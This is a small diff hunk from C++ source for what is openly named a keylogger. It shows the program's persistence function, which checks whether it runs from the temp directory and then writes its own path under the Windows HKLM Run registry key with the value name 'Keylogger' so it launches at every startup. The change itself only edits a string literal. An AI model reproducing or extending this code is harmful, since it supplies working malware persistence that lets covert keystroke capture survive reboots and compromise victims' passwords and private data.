@@ -15,7 +15,7 @@ bool PersistantApplication() {
 
 	if(exeDir.substr(0, tempDir.length()) == tempDir) {
 		HKEY key;
-		long regeditOpen = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE|KEY_READ, &key);
+		long regeditOpen = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE|KEY_READ, &key);
 		if(regeditOpen == ERROR_SUCCESS) {
 			RegSetValueExA(key, "Keylogger", 0, REG_SZ, (BYTE*)exePath, sizeof(exePath));
 			RegCloseKey(key);
